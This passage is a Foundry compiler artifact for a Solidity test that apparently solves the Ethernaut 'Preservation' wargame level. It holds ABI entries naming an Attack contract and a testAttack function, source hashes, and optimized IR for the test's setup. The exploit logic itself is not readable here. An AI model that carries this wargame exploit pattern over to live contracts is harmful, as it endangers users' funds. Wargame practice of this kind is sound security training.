es32\"}],\"name\":\"log_bytes32\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"int256\",\"name\":\"\",\"type\":\"int256\"}],\"name\":\"log_int\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"string\",\"name\":\"key\",\"type\":\"string\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"val\",\"type\":\"address\"}],\"name\":\"log_named_address\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"string\",\"name\":\"key\",\"type\":\"string\"},{\"indexed\":false,\"internalType\":\"uint256[]\",\"name\":\"val\",\"type\":\"uint256[]\"}],\"name\":\"log_named_array\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"string\",\"name\":\"key\",\"type\":\"string\"},{\"indexed\":false,\"internalType\":\"int256[]\",\"name\":\"val\",\"type\":\"int256[]\"}],\"name\":\"log_named_array\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"string\",\"name\":\"key\",\"type\":\"string\"},{\"indexed\":false,\"internalType\":\"address[]\",\"name\":\"val\",\"type\":\"address[]\"}],\"name\":\"log_named_array\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"string\",\"name\":\"key\",\"type\":\"string\"},{\"indexed\":false,\"internalType\":\"bytes\",\"name\":\"val\",\"type\":\"bytes\"}],\"name\":\"log_named_bytes\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"string\",\"name\":\"key\",\"type\":\"string\"},{\"indexed\":false,\"internalType\":\"bytes32\",\"name\":\"val\",\"type\":\"bytes32\"}],\"name\":\"log_named_bytes32\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"string\",\"name\":\"key\",\"type\":\"string\"},{\"indexed\":false,\"internalType\":\"int256\",\"name\":\"val\",\"type\":\"int256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"decimals\",\"type\":\"uint256\"}],\"name\":\"log_named_decimal_int\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"string\",\"name\":\"key\",\"type\":\"string\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"val\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"decimals\",\"type\":\"uint256\"}],\"name\":\"log_named_decimal_uint\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"string\",\"name\":\"key\",\"type\":\"string\"},{\"indexed\":false,\"internalType\":\"int256\",\"name\":\"val\",\"type\":\"int256\"}],\"name\":\"log_named_int\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"string\",\"name\":\"key\",\"type\":\"string\"},{\"indexed\":false,\"internalType\":\"string\",\"name\":\"val\",\"type\":\"string\"}],\"name\":\"log_named_string\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"string\",\"name\":\"key\",\"type\":\"string\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"val\",\"type\":\"uint256\"}],\"name\":\"log_named_uint\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"name\":\"log_string\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"log_uint\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"bytes\",\"name\":\"\",\"type\":\"bytes\"}],\"name\":\"logs\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"IS_SCRIPT\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"IS_TEST\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"alice\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"attack\",\"outputs\":[{\"internalType\":\"contract Attack\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"failed\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pr\",\"outputs\":[{\"internalType\":\"contract Preservation\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"setUp\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"testAttack\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"timezone1\",\"outputs\":[{\"internalType\":\"contract LibraryContract\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"timezone2\",\"outputs\":[{\"internalType\":\"contract LibraryContract\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"vm\",\"outputs\":[{\"internalType\":\"contract Vm\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"test/ethernaut/Preservation.t.sol\":\"PreservationTest\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[\":@openzeppelin/=lib/openzeppelin-contracts/\",\":@solmate/=lib/solmate/src/\",\":ds-test/=lib/forge-std/lib/ds-test/src/\",\":forge-std/=lib/forge-std/src/\",\":openzeppelin-contracts/=lib/openzeppelin-contracts/contracts/\",\":solmate/=lib/solmate/src/\"]},\"sources\":{\"lib/forge-std/lib/ds-test/src/test.sol\":{\"keccak256\":\"0xb39cd1d5220cb474947b131e15a4538334b7e886af244b440ae5c9c6bba96a54\",\"license\":\"GPL-3.0-or-later\",\"urls\":[\"bzz-raw://3101520221449ac0070bda3881311a71d9aa87e5210765e875246922cb5cb5f5\",\"dweb:/ipfs/Qmbg6kAHNoG7ox9N9Xqd9Ere2H2XixMFWFqvyPwFCzB3Gr\"]},\"lib/forge-std/src/Script.sol\":{\"keccak256\":\"0x9d09c1e55cd508d3376cff9961625d51d73f8ce075ec1e9deed41408a4556e00\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://8880c5551daf337ab91665a9ce593df67a9eb11b0bee820f631d324d2fdd3a8b\",\"dweb:/ipfs/QmNpvSBGnS9Jr6Swd6XKsijG59a4yjYemWCFwprjKFkpNC\"]},\"lib/forge-std/src/StdJson.sol\":{\"keccak256\":\"0x1297a1cc393bc8163ccf143e5335536e78cb25ac24a4f6dfdb25f5746dd4827e\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://945ccffad9fc09d2aa0ac200a80dcfa2f491dba8680fc9c3d3d450d891284b87\",\"dweb:/ipfs/QmYSfFb1L6LN1ZB9KWzZqxt2iAbpuFDskBcU1Bz4RiyuQ5\"]},\"lib/forge-std/src/Test.sol\":{\"keccak256\":\"0x6c9cbd51234372b66bf7c146870edf0855770c46e960a8fae8f354ddf382876b\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://fd0ff1f449294dd1447b9d483c52d78e137d8cac518646e76df9fdd4d185d6c2\",\"dweb:/ipfs/QmS3JP4vKgvAWo8Tc7zVrGxbdR7t37ayk1mTHN3seD6UAZ\"]},\"lib/forge-std/src/Vm.sol\":{\"keccak256\":\"0x1a5767028a0c3985e991456fc9650055e28b01b787c56b11f66ac30498a153ab\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://f86887212eacca450a15a8a5bf9fe83fd91a2ba623df8e9c32c75a31824c8ea2\",\"dweb:/ipfs/QmTUHBNdZwntgjbFZne7fY9ZJLNGYWaq3uWfGk6FyqdAkB\"]},\"lib/forge-std/src/console.sol\":{\"keccak256\":\"0x91d5413c2434ca58fd278b6e1e79fd98d10c83931cc2596a6038eee4daeb34ba\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://91ccea707361e48b9b7a161fe81f496b9932bc471e9c4e4e1e9c283f2453cc70\",\"dweb:/ipfs/QmcB66sZhQ6Kz7MUHcLE78YXRUZxoZnnxZjN6yATsbB2ec\"]},\"lib/forge-std/src/console2.sol\":{\"keccak256\":\"0xbeb823fcdb356244a83aaccdf828ad019ecc1ffaa3dff18e624fc6d5714ea671\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://4cbe9400340e5f9ec55e2aff3bad1c15fa3afbbe37e80800e6f3fed2ad26854f\",\"dweb:/ipfs/QmdJBABsuXkvWxVzEyGXsTE3vyfBPXDdw5xvvtUz3JeoYW\"]},\"src/ethernaut/level_16/Preservation.sol\":{\"keccak256\":\"0xe1a0cc5e5639c5995fb702b56e00c4e2d8ba2d99d3cba47401236173f7039d6c\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://f96b54c49588dd246711525cf3f03f1d4d2c306768e42d11e9a4a2a97f2b996c\",\"dweb:/ipfs/QmQ9FwP5XA8s8zGtDPWonaBauXXQ5jBSRaM7ktjwMEvSpF\"]},\"test/ethernaut/Preservation.t.sol\":{\"keccak256\":\"0xc853d1714bd342307b420f14ef70f60aa296f79ace5e394e2a593649382b3563\",\"license\":\"UNLICENSED\",\"urls\":[\"bzz-raw://2325f96e788e03271f4f9a3c8c91c0607dc6a08cbd484d146663193072a59604\",\"dweb:/ipfs/QmPLed6SDsGQyaNXLBy3eEyfcPc15Ku3m63QL5t3P1sswY\"]}},\"version\":1}",
  "metadata": {
    "compiler": {
      "version": "0.8.15+commit.e14f2714"
    },
    "language": "Solidity",
    "output": {
      "abi": [
        {
          "inputs": [
            {
              "internalType": "string",
              "name": "",
              "type": "string",
              "indexed": false
            }
          ],
          "type": "event",
          "name": "log",
          "anonymous": false
        },
        {
          "inputs": [
            {
              "internalType": "address",
              "name": "",
              "type": "address",
              "indexed": false
            }
          ],
          "type": "event",
          "name": "log_address",
          "anonymous": false
        },
        {
          "inputs": [
            {
              "internalType": "uint256[]",
              "name": "val",
              "type": "uint256[]",
              "indexed": false
            }
          ],
          "type": "event",
          "name": "log_array",
          "anonymous": false
        },
        {
          "inputs": [
            {
              "internalType": "int256[]",
              "name": "val",
              "type": "int256[]",
              "indexed": false
            }
          ],
          "type": "event",
          "name": "log_array",
          "anonymous": false
        },
        {
          "inputs": [
            {
              "internalType": "address[]",
              "name": "val",
              "type": "address[]",
              "indexed": false
            }
          ],
          "type": "event",
          "name": "log_array",
          "anonymous": false
        },
        {
          "inputs": [
            {
              "internalType": "bytes",
              "name": "",
              "type": "bytes",
              "indexed": false
            }
          ],
          "type": "event",
          "name": "log_bytes",
          "anonymous": false
        },
        {
          "inputs": [
            {
              "internalType": "bytes32",
              "name": "",
              "type": "bytes32",
              "indexed": false
            }
          ],
          "type": "event",
          "name": "log_bytes32",
          "anonymous": false
        },
        {
          "inputs": [
            {
              "internalType": "int256",
              "name": "",
              "type": "int256",
              "indexed": false
            }
          ],
          "type": "event",
          "name": "log_int",
          "anonymous": false
        },
        {
          "inputs": [
            {
              "internalType": "string",
              "name": "key",
              "type": "string",
              "indexed": false
            },
            {
              "internalType": "address",
              "name": "val",
              "type": "address",
              "indexed": false
            }
          ],
          "type": "event",
          "name": "log_named_address",
          "anonymous": false
        },
        {
          "inputs": [
            {
              "internalType": "string",
              "name": "key",
              "type": "string",
              "indexed": false
            },
            {
              "internalType": "uint256[]",
              "name": "val",
              "type": "uint256[]",
              "indexed": false
            }
          ],
          "type": "event",
          "name": "log_named_array",
          "anonymous": false
        },
        {
          "inputs": [
            {
              "internalType": "string",
              "name": "key",
              "type": "string",
              "indexed": false
            },
            {
              "internalType": "int256[]",
              "name": "val",
              "type": "int256[]",
              "indexed": false
            }
          ],
          "type": "event",
          "name": "log_named_array",
          "anonymous": false
        },
        {
          "inputs": [
            {
              "internalType": "string",
              "name": "key",
              "type": "string",
              "indexed": false
            },
            {
              "internalType": "address[]",
              "name": "val",
              "type": "address[]",
              "indexed": false
            }
          ],
          "type": "event",
          "name": "log_named_array",
          "anonymous": false
        },
        {
          "inputs": [
            {
              "internalType": "string",
              "name": "key",
              "type": "string",
              "indexed": false
            },
            {
              "internalType": "bytes",
              "name": "val",
              "type": "bytes",
              "indexed": false
            }
          ],
          "type": "event",
          "name": "log_named_bytes",
          "anonymous": false
        },
        {
          "inputs": [
            {
              "internalType": "string",
              "name": "key",
              "type": "string",
              "indexed": false
            },
            {
              "internalType": "bytes32",
              "name": "val",
              "type": "bytes32",
              "indexed": false
            }
          ],
          "type": "event",
          "name": "log_named_bytes32",
          "anonymous": false
        },
        {
          "inputs": [
            {
              "internalType": "string",
              "name": "key",
              "type": "string",
              "indexed": false
            },
            {
              "internalType": "int256",
              "name": "val",
              "type": "int256",
              "indexed": false
            },
            {
              "internalType": "uint256",
              "name": "decimals",
              "type": "uint256",
              "indexed": false
            }
          ],
          "type": "event",
          "name": "log_named_decimal_int",
          "anonymous": false
        },
        {
          "inputs": [
            {
              "internalType": "string",
              "name": "key",
              "type": "string",
              "indexed": false
            },
            {
              "internalType": "uint256",
              "name": "val",
              "type": "uint256",
              "indexed": false
            },
            {
              "internalType": "uint256",
              "name": "decimals",
              "type": "uint256",
              "indexed": false
            }
          ],
          "type": "event",
          "name": "log_named_decimal_uint",
          "anonymous": false
        },
        {
          "inputs": [
            {
              "internalType": "string",
              "name": "key",
              "type": "string",
              "indexed": false
            },
            {
              "internalType": "int256",
              "name": "val",
              "type": "int256",
              "indexed": false
            }
          ],
          "type": "event",
          "name": "log_named_int",
          "anonymous": false
        },
        {
          "inputs": [
            {
              "internalType": "string",
              "name": "key",
              "type": "string",
              "indexed": false
            },
            {
              "internalType": "string",
              "name": "val",
              "type": "string",
              "indexed": false
            }
          ],
          "type": "event",
          "name": "log_named_string",
          "anonymous": false
        },
        {
          "inputs": [
            {
              "internalType": "string",
              "name": "key",
              "type": "string",
              "indexed": false
            },
            {
              "internalType": "uint256",
              "name": "val",
              "type": "uint256",
              "indexed": false
            }
          ],
          "type": "event",
          "name": "log_named_uint",
          "anonymous": false
        },
        {
          "inputs": [
            {
              "internalType": "string",
              "name": "",
              "type": "string",
              "indexed": false
            }
          ],
          "type": "event",
          "name": "log_string",
          "anonymous": false
        },
        {
          "inputs": [
            {
              "internalType": "uint256",
              "name": "",
              "type": "uint256",
              "indexed": false
            }
          ],
          "type": "event",
          "name": "log_uint",
          "anonymous": false
        },
        {
          "inputs": [
            {
              "internalType": "bytes",
              "name": "",
              "type": "bytes",
              "indexed": false
            }
          ],
          "type": "event",
          "name": "logs",
          "anonymous": false
        },
        {
          "inputs": [],
          "stateMutability": "view",
          "type": "function",
          "name": "IS_SCRIPT",
          "outputs": [
            {
              "internalType": "bool",
              "name": "",
              "type": "bool"
            }
          ]
        },
        {
          "inputs": [],
          "stateMutability": "view",
          "type": "function",
          "name": "IS_TEST",
          "outputs": [
            {
              "internalType": "bool",
              "name": "",
              "type": "bool"
            }
          ]
        },
        {
          "inputs": [],
          "stateMutability": "view",
          "type": "function",
          "name": "alice",
          "outputs": [
            {
              "internalType": "address",
              "name": "",
              "type": "address"
            }
          ]
        },
        {
          "inputs": [],
          "stateMutability": "view",
          "type": "function",
          "name": "attack",
          "outputs": [
            {
              "internalType": "contract Attack",
              "name": "",
              "type": "address"
            }
          ]
        },
        {
          "inputs": [],
          "stateMutability": "nonpayable",
          "type": "function",
          "name": "failed",
          "outputs": [
            {
              "internalType": "bool",
              "name": "",
              "type": "bool"
            }
          ]
        },
        {
          "inputs": [],
          "stateMutability": "view",
          "type": "function",
          "name": "pr",
          "outputs": [
            {
              "internalType": "contract Preservation",
              "name": "",
              "type": "address"
            }
          ]
        },
        {
          "inputs": [],
          "stateMutability": "nonpayable",
          "type": "function",
          "name": "setUp"
        },
        {
          "inputs": [],
          "stateMutability": "nonpayable",
          "type": "function",
          "name": "testAttack"
        },
        {
          "inputs": [],
          "stateMutability": "view",
          "type": "function",
          "name": "timezone1",
          "outputs": [
            {
              "internalType": "contract LibraryContract",
              "name": "",
              "type": "address"
            }
          ]
        },
        {
          "inputs": [],
          "stateMutability": "view",
          "type": "function",
          "name": "timezone2",
          "outputs": [
            {
              "internalType": "contract LibraryContract",
              "name": "",
              "type": "address"
            }
          ]
        },
        {
          "inputs": [],
          "stateMutability": "view",
          "type": "function",
          "name": "vm",
          "outputs": [
            {
              "internalType": "contract Vm",
              "name": "",
              "type": "address"
            }
          ]
        }
      ],
      "devdoc": {
        "kind": "dev",
        "methods": {},
        "version": 1
      },
      "userdoc": {
        "kind": "user",
        "methods": {},
        "version": 1
      }
    },
    "settings": {
      "remappings": [
        ":@openzeppelin/=lib/openzeppelin-contracts/",
        ":@solmate/=lib/solmate/src/",
        ":ds-test/=lib/forge-std/lib/ds-test/src/",
        ":forge-std/=lib/forge-std/src/",
        ":openzeppelin-contracts/=lib/openzeppelin-contracts/contracts/",
        ":solmate/=lib/solmate/src/"
      ],
      "optimizer": {
        "enabled": true,
        "runs": 200
      },
      "metadata": {
        "bytecodeHash": "ipfs"
      },
      "compilationTarget": {
        "test/ethernaut/Preservation.t.sol": "PreservationTest"
      },
      "libraries": {}
    },
    "sources": {
      "lib/forge-std/lib/ds-test/src/test.sol": {
        "keccak256": "0xb39cd1d5220cb474947b131e15a4538334b7e886af244b440ae5c9c6bba96a54",
        "urls": [
          "bzz-raw://3101520221449ac0070bda3881311a71d9aa87e5210765e875246922cb5cb5f5",
          "dweb:/ipfs/Qmbg6kAHNoG7ox9N9Xqd9Ere2H2XixMFWFqvyPwFCzB3Gr"
        ],
        "license": "GPL-3.0-or-later"
      },
      "lib/forge-std/src/Script.sol": {
        "keccak256": "0x9d09c1e55cd508d3376cff9961625d51d73f8ce075ec1e9deed41408a4556e00",
        "urls": [
          "bzz-raw://8880c5551daf337ab91665a9ce593df67a9eb11b0bee820f631d324d2fdd3a8b",
          "dweb:/ipfs/QmNpvSBGnS9Jr6Swd6XKsijG59a4yjYemWCFwprjKFkpNC"
        ],
        "license": "MIT"
      },
      "lib/forge-std/src/StdJson.sol": {
        "keccak256": "0x1297a1cc393bc8163ccf143e5335536e78cb25ac24a4f6dfdb25f5746dd4827e",
        "urls": [
          "bzz-raw://945ccffad9fc09d2aa0ac200a80dcfa2f491dba8680fc9c3d3d450d891284b87",
          "dweb:/ipfs/QmYSfFb1L6LN1ZB9KWzZqxt2iAbpuFDskBcU1Bz4RiyuQ5"
        ],
        "license": "MIT"
      },
      "lib/forge-std/src/Test.sol": {
        "keccak256": "0x6c9cbd51234372b66bf7c146870edf0855770c46e960a8fae8f354ddf382876b",
        "urls": [
          "bzz-raw://fd0ff1f449294dd1447b9d483c52d78e137d8cac518646e76df9fdd4d185d6c2",
          "dweb:/ipfs/QmS3JP4vKgvAWo8Tc7zVrGxbdR7t37ayk1mTHN3seD6UAZ"
        ],
        "license": "MIT"
      },
      "lib/forge-std/src/Vm.sol": {
        "keccak256": "0x1a5767028a0c3985e991456fc9650055e28b01b787c56b11f66ac30498a153ab",
        "urls": [
          "bzz-raw://f86887212eacca450a15a8a5bf9fe83fd91a2ba623df8e9c32c75a31824c8ea2",
          "dweb:/ipfs/QmTUHBNdZwntgjbFZne7fY9ZJLNGYWaq3uWfGk6FyqdAkB"
        ],
        "license": "MIT"
      },
      "lib/forge-std/src/console.sol": {
        "keccak256": "0x91d5413c2434ca58fd278b6e1e79fd98d10c83931cc2596a6038eee4daeb34ba",
        "urls": [
          "bzz-raw://91ccea707361e48b9b7a161fe81f496b9932bc471e9c4e4e1e9c283f2453cc70",
          "dweb:/ipfs/QmcB66sZhQ6Kz7MUHcLE78YXRUZxoZnnxZjN6yATsbB2ec"
        ],
        "license": "MIT"
      },
      "lib/forge-std/src/console2.sol": {
        "keccak256": "0xbeb823fcdb356244a83aaccdf828ad019ecc1ffaa3dff18e624fc6d5714ea671",
        "urls": [
          "bzz-raw://4cbe9400340e5f9ec55e2aff3bad1c15fa3afbbe37e80800e6f3fed2ad26854f",
          "dweb:/ipfs/QmdJBABsuXkvWxVzEyGXsTE3vyfBPXDdw5xvvtUz3JeoYW"
        ],
        "license": "MIT"
      },
      "src/ethernaut/level_16/Preservation.sol": {
        "keccak256": "0xe1a0cc5e5639c5995fb702b56e00c4e2d8ba2d99d3cba47401236173f7039d6c",
        "urls": [
          "bzz-raw://f96b54c49588dd246711525cf3f03f1d4d2c306768e42d11e9a4a2a97f2b996c",
          "dweb:/ipfs/QmQ9FwP5XA8s8zGtDPWonaBauXXQ5jBSRaM7ktjwMEvSpF"
        ],
        "license": "MIT"
      },
      "test/ethernaut/Preservation.t.sol": {
        "keccak256": "0xc853d1714bd342307b420f14ef70f60aa296f79ace5e394e2a593649382b3563",
        "urls": [
          "bzz-raw://2325f96e788e03271f4f9a3c8c91c0607dc6a08cbd484d146663193072a59604",
          "dweb:/ipfs/QmPLed6SDsGQyaNXLBy3eEyfcPc15Ku3m63QL5t3P1sswY"
        ],
        "license": "UNLICENSED"
      }
    },
    "version": 1
  },
  "irOptimized": "/// @use-src 0:\"lib/forge-std/lib/ds-test/src/test.sol\", 1:\"lib/forge-std/src/Script.sol\", 3:\"lib/forge-std/src/Test.sol\", 18:\"test/ethernaut/Preservation.t.sol\"\nobject \"PreservationTest_24327\" {\n    code {\n        {\n            /// @src 18:593:1658  \"contract PreservationTest is Test {...\"\n            let _1 := memoryguard(0x80)\n            mstore(64, _1)\n            if callvalue() { revert(0, 0) }\n            sstore(/** @src 0:1594:1598  \"true\" */ 0x00, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ or(and(sload(/** @src 0:1594:1598  \"true\" */ 0x00), /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ not(16711935)), 65537))\n            let _2 := datasize(\"PreservationTest_24327_deployed\")\n            codecopy(_1, dataoffset(\"PreservationTest_24327_deployed\"), _2)\n            return(_1, _2)\n        }\n    }\n    /// @use-src 0:\"lib/forge-std/lib/ds-test/src/test.sol\", 1:\"lib/forge-std/src/Script.sol\", 18:\"test/ethernaut/Preservation.t.sol\"\n    object \"PreservationTest_24327_deployed\" {\n        code {\n            {\n                /// @src 18:593:1658  \"contract PreservationTest is Test {...\"\n                let _1 := memoryguard(0x80)\n                let _2 := 64\n                mstore(_2, _1)\n                let _3 := 4\n                if iszero(lt(calldatasize(), _3))\n                {\n                    let _4 := 0\n                    switch shr(224, calldataload(_4))\n                    case 0x0a9254e4 {\n                        if callvalue() { revert(_4, _4) }\n                        if slt(add(calldatasize(), not(3)), _4) { revert(_4, _4) }\n                        /// @src 18:914:935  \"new LibraryContract()\"\n                        let _5 := datasize(\"LibraryContract_23898\")\n                        let _6 := add(_1, _5)\n                        let _7 := 0xffffffffffffffff\n                        if or(gt(_6, _7), lt(_6, _1))\n                        {\n                            /// @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\"\n                            mstore(/** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _4, /** @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\" */ shl(224, 0x4e487b71))\n                            mstore(/** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _3, /** @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\" */ 0x41)\n                            revert(/** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _4, /** @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\" */ 0x24)\n                        }\n                        /// @src 18:914:935  \"new LibraryContract()\"\n                        let _8 := dataoffset(\"LibraryContract_23898\")\n                        datacopy(_1, _8, _5)\n                        let expr_address := create(/** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _4, /** @src 18:914:935  \"new LibraryContract()\" */ _1, sub(_6, _1))\n                        if iszero(expr_address)\n                        {\n                            /// @src 18:593:1658  \"contract PreservationTest is Test {...\"\n                            let pos := mload(_2)\n                            returndatacopy(pos, _4, returndatasize())\n                            revert(pos, returndatasize())\n                        }\n                        let _9 := sub(shl(160, /** @src 18:914:935  \"new LibraryContract()\" */ 1), 1)\n                        /// @src 18:593:1658  \"contract PreservationTest is Test {...\"\n                        let _10 := shl(160, 0xffffffffffffffffffffffff)\n                        sstore(/** @src 18:902:935  \"timezone1 = new LibraryContract()\" */ 0x09, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ or(and(sload(/** @src 18:902:935  \"timezone1 = new LibraryContract()\" */ 0x09), /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _10), and(expr_address, _9)))\n                        /// @src 18:957:978  \"new LibraryContract()\"\n                        let _11 := /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ mload(_2)\n                        /// @src 18:957:978  \"new LibraryContract()\"\n                        let _12 := add(_11, _5)\n                        if or(gt(_12, /** @src 18:914:935  \"new LibraryContract()\" */ _7), /** @src 18:957:978  \"new LibraryContract()\" */ lt(_12, _11))\n                        {\n                            /// @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\"\n                            mstore(/** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _4, /** @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\" */ shl(224, 0x4e487b71))\n                            mstore(/** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _3, /** @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\" */ 0x41)\n                            revert(/** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _4, /** @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\" */ 0x24)\n                        }\n                        /// @src 18:957:978  \"new LibraryContract()\"\n                        datacopy(_11, _8, _5)\n                        let expr_address_1 := create(/** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _4, /** @src 18:957:978  \"new LibraryContract()\" */ _11, sub(_12, _11))\n                        if iszero(expr_address_1)\n                        {\n                            /// @src 18:593:1658  \"contract PreservationTest is Test {...\"\n                            let pos_1 := mload(_2)\n                            returndatacopy(pos_1, _4, returndatasize())\n                            revert(pos_1, returndatasize())\n                        }\n                        sstore(/** @src 18:945:978  \"timezone2 = new LibraryContract()\" */ 0x0a, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ or(and(sload(/** @src 18:945:978  \"timezone2 = new LibraryContract()\" */ 0x0a), /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _10), and(expr_address_1, _9)))\n                        /// @src 18:997:1007  \"vm.addr(1)\"\n                        let _13 := /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ mload(_2)\n                        /// @src 18:997:1007  \"vm.addr(1)\"\n                        mstore(_13, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ shl(224, 0xffa18649))\n                        /// @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\"\n                        mstore(/** @src 18:997:1007  \"vm.addr(1)\" */ add(_13, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _3), /** @src 18:1005:1006  \"1\" */ 0x01)\n                        /// @src 18:997:1007  \"vm.addr(1)\"\n                        let _14 := call(gas(), /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ 0x7109709ecfa91a80626ff3989d68f67f5b1dd12d, _4, /** @src 18:997:1007  \"vm.addr(1)\" */ _13, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ 36, /** @src 18:997:1007  \"vm.addr(1)\" */ _13, 32)\n                        if iszero(_14)\n                        {\n                            /// @src 18:593:1658  \"contract PreservationTest is Test {...\"\n                            let pos_2 := mload(_2)\n                            returndatacopy(pos_2, _4, returndatasize())\n                            revert(pos_2, returndatasize())\n                        }\n                        /// @src 18:997:1007  \"vm.addr(1)\"\n                        let expr := /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _4\n                        /// @src 18:997:1007  \"vm.addr(1)\"\n                        if _14\n                        {\n                            let _15 := 32\n                            if gt(_15, returndatasize()) { _15 := returndatasize() }\n                            finalize_allocation(_13, _15)\n                            expr := abi_decode_address_fromMemory(_13, add(_13, _15))\n                        }\n                        /// @src 18:593:1658  \"contract PreservationTest is Test {...\"\n                        sstore(/** @src 18:989:1007  \"alice = vm.addr(1)\" */ 0x0c, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ or(and(sload(/** @src 18:989:1007  \"alice = vm.addr(1)\" */ 0x0c), /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _10), and(expr, _9)))\n                        let value := and(sload(/** @src 18:902:935  \"timezone1 = new LibraryContract()\" */ 0x09), /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _9)\n                        let value_1 := and(sload(/** @src 18:945:978  \"timezone2 = new LibraryContract()\" */ 0x0a), /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _9)\n                        /// @src 18:1022:1078  \"new 